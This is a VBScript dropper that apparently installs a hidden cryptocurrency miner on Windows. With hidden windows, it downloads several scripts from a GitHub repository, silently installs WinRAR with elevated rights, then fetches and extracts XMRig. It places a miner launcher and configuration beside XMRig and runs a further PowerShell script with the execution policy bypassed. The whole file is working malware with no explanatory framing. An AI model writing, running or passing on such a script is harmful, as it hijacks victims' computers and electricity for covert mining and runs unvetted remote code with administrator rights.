Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Autorun.vbs -OutFile C:\Users\Public\Downloads\Autorun.vbs", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/hid.vbs -OutFile C:\Users\Public\Downloads\hid.vbs", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -OutFile C:\Users\Public\Downloads\winrar-x64-701.exe", 0, True
objShell.Run "powershell.exe -Command Start-Process -FilePath 'C:\Users\Public\Downloads\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip", 0, True
objShell.Run "powershell.exe -Command & 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' 'C:\Users\Public\Downloads\'", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/COINRUN.cmd -OutFile C:\Users\Public\Downloads\COINRUN.cmd", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\COINRUN.cmd -Destination C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd -Force", 0, True
objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
objShell.Run "powershell.exe -Command Start-Process -FilePath C:\Users\Public\Downloads\hid.vbs", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
objShell.Run "powershell.exe exit", 0, False
